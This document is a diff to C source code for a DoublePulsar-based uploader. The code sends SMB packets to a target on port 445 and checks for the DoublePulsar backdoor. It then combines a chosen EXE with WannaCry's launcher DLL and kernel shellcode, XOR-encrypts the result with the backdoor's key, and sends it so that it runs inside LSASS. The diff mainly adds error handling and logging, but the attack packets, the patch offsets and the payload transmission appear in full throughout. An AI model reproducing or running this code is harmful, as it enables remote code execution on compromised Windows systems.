@@ -1,48 +1,50 @@
+/*
+This program performs a process of merging a sample EXE, like Putty.exe, with the Wannacry launcher.dll, which is found in the worm.
+The launcher.dll acts as a skeleton, enabling the attachment of an executable at the end of it.
+When executed, the DLL extracts the EXE resource, writes it to the disk, and runs it.
+
+Additionally, the program combines the Shellcode with both the DLL and the executable.
+To ensure the process works correctly, certain values need to be patched.
+Specifically, the total size of the DLL and Userland shellcode required for the kernel shellcode to determine the amount of data to
+copy into the victim process (LSASS) should be calculated.
+
+For example, if the total DLL size (including your EXE) is 0x50D800 bytes, and the Userland shellcode is 3978 bytes, then the
+calculation would be:
+Total DLL size (including EXE) = 0x50D800 bytes
+Kernel Shellcode[2158] = 0x50D800 + 3978
+
+The user also needs to update the DLL size in the Userland shellcode section with the following values:
+Kernel Shellcode[2166+0xF82] = 0x50D800 (DLL length)
+Kernel Shellcode[2166+0xF86] = 1 (DLL ordinal)
+
+Other essential values to be aware of include:
+- Total size of Kernel Shellcode: 0x1800
+- Portion of the shellcode related to the kernel: 2166
+- Size of Userland Shellcode: 3978
+- Sum of Kernel Shellcode (2166) + Userland Shellcode (3978) = 0x1800 = 6144
+
+Furthermore, the size of Wannacry's launcher DLL is 0xc8a4.
+
+Before applying XOR encryption, it is crucial to include the length of the EXE after the DLL.
+The payload buffer will then be XOR encrypted with the DoublePulsar key in preparation for distribution.
+*/
+
 #define _CRT_SECURE_NO_WARNINGS
-#include <stdio.h>
 #include <Windows.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <winsock.h>
-#include "Doublepulsar_launcher_dll.h"
+#include "launcher_dll.h"
 #include "rundll_shellcode.h"
+#include "helpers/errors.h"
+
 #pragma comment(lib, "ws2_32.lib")
 
 // Auto new line each time printing something
-#define _printf(...) printf("\n"__VA_ARGS__)
-/*
-The program reads in a sample EXE, such as Putty.exe, and merges it with the Wannacry launcher.dll found in the worm.
-This DLL serves as a skeleton that allows attaching an executable at the end. When loaded, the DLL extracts the EXE resource,
-writes it to disk, and runs it.
+#define _printf(...) printf("\n" __VA_ARGS__)
 
-Next, the program merges the Shellcode with the DLL and executable. It patches the required values for the process to work:
-
-// The size of the DLL + Userland shellcode needed for the kernel shellcode to determine how much to copy into the victim process (LSASS).
-
-Example: Total DLL size (including your EXE) = 0x50D800 bytes in size.
-
-Update that value in the kernel shellcode, which also includes 3978 bytes of userland shellcode.
-This instructs the kernel shellcode to tell the OS how much memory to allocate for the DLL and the Userland DLL bootstrap shellcode.
-Kernel Shellcode[2158] = 0x50D800 + 3978;
-
-USERLAND SHELLCODE HERE:
-Update the size of the DLL here:
-Kernel Shellcode[2166+0xF82] = 0x50D800; // DLL length
-Kernel Shellcode[2166+0xF86] = 1; // DLL ordinal
-
-Important values to know:
-Kernel Shellcode total: 0x1800
-Kernel portion of the shellcode (kernel): 2166
-Userland Shellcode size: 3978
-Kernel Shellcode (2166) + Userland Shellcode (3978) = 0x1800 = 6144
-
-Size of Wannacry's launcher DLL: 0xc8a4
-
-BEFORE the XOR encryption, you must include the EXE length after the DLL, which comes after the kernel shellcode and at the end of the DLL length (0xc8a4).
-The payload buffer is then XOR encrypted with the DoublePulsar key and ready to ship.
-*/
-
-// SmbNegociate represents the SMB negotiation packet used in the DoublePulsar-based exe uploader.
+// This Array contains the SMB negotiation packet.
 // It is responsible for initiating the SMB session negotiation.
 unsigned char SmbNegociate[] = {
     "\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
@@ -50,7 +52,7 @@ unsigned char SmbNegociate[] = {
     "\x4d\x20\x30\x2e\x31\x32\x00"
 };
 
-// Session_Setup_AndX_Request contains the SMB Session Setup AndX Request packet for DoublePulsar.
+// This Array contains the SMB Session Setup AndX Request packet.
 // It establishes the session with the target system.
 unsigned char Session_Setup_AndX_Request[] = {
     "\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00"
@@ -59,8 +61,8 @@ unsigned char Session_Setup_AndX_Request[] = {
     "\x00\x6e\x74\x00\x70\x79\x73\x6d\x62\x00"
 };
 
-// SMB_TreeConnectAndX holds the Tree Connect AndX packet for the DoublePulsar-based exe uploader.
-// This packet is used to connect to a share on the target system.
+// This array contains the Tree Connect AndX packet.
+// It's used to connect to a share on the target system.
 unsigned char SMB_TreeConnectAndX[] = {
     "\x00\x00\x00\x5A\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8\x00\x00\x00\x00\x00\x00"
     "\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE\x00\x08\x30\x00\x04\xFF\x00\x5A\x00\x08\x00\x01"
@@ -68,13 +70,11 @@ unsigned char SMB_TreeConnectAndX[] = {
 };
 
 // SMB_TreeConnectAndX_ is an auxiliary array used in the Tree Connect AndX packet construction.
-unsigned char SMB_TreeConnectAndX_[] = {
-    "\x00\x00\x3F\x3F\x3F\x3F\x3F\x00"
-};
+unsigned char SMB_TreeConnectAndX_[] = { "\x00\x00\x3F\x3F\x3F\x3F\x3F\x00" };
 
-//Fixed Trans2 session setup PING packet. This should work
-// trans2_request represents the Trans2 Session Setup PING packet used in the DoublePulsar-based exe uploader.
-// This packet is used to set up a transaction 2 subcommand session with the target system.
+// Fixed Trans2 session setup PING packet. This should work!
+// This array contains the Trans2 Session Setup PING packet.
+// THis Package is used to set up a transaction 2 subcommand session with the target system.
 unsigned char trans2_request[] = {
     "\x00\x00\x00\x4E\xFF\x53\x4D\x42\x32\x00\x00\x00\x00\x18\x07\xC0\x00\x00\x00\x00\x00\x00"
     "\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE\x00\x08\x41\x00\x0F\x0C\x00\x00\x00\x01\x00\x00"
@@ -82,8 +82,8 @@ unsigned char trans2_request[] = {
     "\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 };
 
-//Trans2 session setup EXEC(C8 or \x25\x89\x1a\x00) request found in Wannacry
-// wannacry_Trans2_Request contains the Trans2 session setup EXEC request used in the Wannacry worm.
+// Trans2 session setup EXEC (C8 or \x25\x89\x1a\x00) request found in WannaCry
+// This Array contains the Trans2 session setup EXEC request used in the Wannacry worm.
 // It allows execution of a shellcode within the target system's LSASS process.
 unsigned char wannacry_Trans2_Request[] = {
     "\x00\x00\x10\x4e\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00"
@@ -91,6 +91,14 @@ unsigned char wannacry_Trans2_Request[] = {
     "\x00\x00\x00\x00\x00\x25\x89\x1a\x00\x00\x00\x0c\x00\x42\x00\x00\x10\x4e\x00\x01\x00\x0e"
     "\x00\x0d\x10\x00"
 };
+
+// The Sizes of The Array's Defined above 
+#define NegociateSize 52
+#define SessionSetupXRequestSize 77
+#define TreeConnectAndXSize 49
+#define TreeConnectAndX_Size 9
+#define Trans2RequestSize 83
+#define WCryTrans2RequestSize 71
 
 // Function to convert Little-Endian data to an unsigned integer
 unsigned int LE2INT(unsigned char* data) {
@@ -178,11 +186,11 @@ unsigned char recvbuff[2048];
 int main(int argc, char* argv[]) {
     DWORD ret;
     WORD userid, treeid, processid, multiplexid;
-
+    const char* targetIP = argv[1];
     // Initialize WinSock
     WSADATA wsData;
     if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) {
-        _printf("WSAStartup Failed!");
+        printError("WSAStartup()");
         return 0;
     }
 
@@ -190,7 +198,7 @@ int main(int argc, char* argv[]) {
     SOCKET sock;
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock == INVALID_SOCKET) {
-        _printf("socket() failed!");
+        printError("socket()");
         goto cleanup;
     }
 
@@ -198,22 +206,29 @@ int main(int argc, char* argv[]) {
     // IP, and port of the target to be connected to.
     struct sockaddr_in server;
     server.sin_family = AF_INET;
-    server.sin_addr.s_addr = inet_addr(argv[1]);
+    server.sin_addr.s_addr = inet_addr(targetIP);
     server.sin_port = htons(445);
 
     // Try to establish a connection to the target
     if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
-        _printf("connect failed!");
+        printError("connect()");
         goto cleanup;
     }
 
     //send SMB negociate packet
-    send(sock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
+    _printf("Sending SMB Negociate Package to %s", targetIP);
+    if (send(sock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0) <= 0) {
+        printError("send() error");
+        goto cleanup;
+    }
     recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
     //send Session Setup AndX request
-    _printf("sending Session_Setup_AndX_Request!");
-    ret = send(sock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
+    _printf("Sending Session Setup AndX Request Package To %s!", targetIP);
+    if (send(sock, (char*)Session_Setup_AndX_Request, SessionSetupXRequestSize, 0) <= 0) {
+        printError("send() error");
+        goto cleanup;
+    }
     recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
     //copy our returned userID value from the previous packet to the TreeConnect request packet
@@ -244,7 +259,11 @@ int main(int argc, char* argv[]) {
     memcpy(packet + 0x20, (char*)&userid, 2); //update userid in packet
 
     //send modified TreeConnect request
-    send(sock, (char*)packet, ptr - packet, 0);
+    _printf("Sending Modified TreeConnect Request");
+    if (send(sock, (char*)packet, ptr - packet, 0) <= 0) {
+        printError("send() error");
+        goto cleanup;
+    }
     recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
     //copy the treeID from the TreeConnect response
@@ -257,7 +276,11 @@ int main(int argc, char* argv[]) {
 
     //if DoublePulsar is enabled, the multiplex ID is incremented by 10
     //will return x51 or 81
-    send(sock, (char*)trans2_request, sizeof(trans2_request) - 1, 0);
+    _printf("Sending trans2 Request");
+    if (send(sock, (char*)trans2_request, sizeof(trans2_request) - 1, 0) <= 0) {
+        printError("send() error");
+        goto cleanup;
+    }
     recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
     unsigned char signature[6];
@@ -323,15 +346,13 @@ int main(int argc, char* argv[]) {
     printf("MZ HEADER EXPECTED:  ");
     hexDump(NULL, (char*)&DLL[0xc8a4 + 4], 4);
 
-    //write out file here for debug purposes
-    /*
+    /*// write out file here for debug purposes
     HANDLE hWriteFile;
     DWORD WriteNumberOfBytesToWrite = 0;
     char szDest[MAX_PATH] = "D:\\STRIKE\\file.dll";
     hWriteFile = CreateFileA(szDest, 0x40000000, 2, 0, 2, 4, 0);
     WriteFile(hWriteFile, (PBYTE*)DLL, DLLSIZE, &WriteNumberOfBytesToWrite, NULL);
-    CloseHandle(hWriteFile);
-    */
+    CloseHandle(hWriteFile);*/
 
     DWORD size = DLLSIZE;
     int difference = size - 4 - dwFileSizeLow;
@@ -463,7 +484,11 @@ int main(int argc, char* argv[]) {
             memcpy((unsigned char*)last_packet + 82, (unsigned char*)pFULLBUFFER + ctx, bytesLeft);
 
             //send the payload
-            send(sock, (char*)last_packet, size_last_packet, 0);
+            _printf("Sending Payload (last_packet)!");
+            if (send(sock, (char*)last_packet, size_last_packet, 0) <= 0) {
+                printError("send() error");
+                goto cleanup;
+            }
             recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
             //DoublePulsar response: STATUS_NOT_IMPLEMENTED
@@ -505,7 +530,11 @@ int main(int argc, char* argv[]) {
         memcpy((unsigned char*)big_packet + 32, (char*)&userid, 2);
 
         //send the payload
-        send(sock, (char*)big_packet, size_normal_packet, 0);
+        _printf("Sending Payload (big_backet)!");
+        if (send(sock, (char*)big_packet, size_normal_packet, 0) <= 0) {
+            printError("send() error");
+            goto cleanup;
+        }
         recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
         //DoublePulsar response: STATUS_NOT_IMPLEMENTED
@@ -544,7 +573,11 @@ int main(int argc, char* argv[]) {
     memcpy((unsigned char*)disconnect_packet + 32, (char*)&userid, 2);
 
     //send the disconnect packet
-    send(sock, (char*)disconnect_packet, sizeof(disconnect_packet) - 1, 0);
+    _printf("Sending Disconnect Package to %s!", targetIP);
+    if (send(sock, (char*)disconnect_packet, sizeof(disconnect_packet) - 1, 0) <= 0) {
+        printError("send() error");
+        goto cleanup;
+    }
     recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
     unsigned char logoff_packet[] = {
@@ -559,10 +592,17 @@ int main(int argc, char* argv[]) {
     memcpy((unsigned char*)logoff_packet + 32, (char*)&userid, 2);
 
     //send the logoff packet
-    send(sock, (char*)logoff_packet, sizeof(logoff_packet) - 1, 0);
+    _printf("Sending the Log off package to %s!", targetIP);
+    if (send(sock, (char*)logoff_packet, sizeof(logoff_packet) - 1, 0) <= 0) {
+        printError("send() error");
+        goto cleanup;
+    }
     recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 cleanup:;
-    if(sock!=INVALID_SOCKET) closesocket(sock);
+    _printf("Performing Cleanup...");
+    if (sock != INVALID_SOCKET)
+        closesocket(sock);
+
     WSACleanup();
 
     return 0;
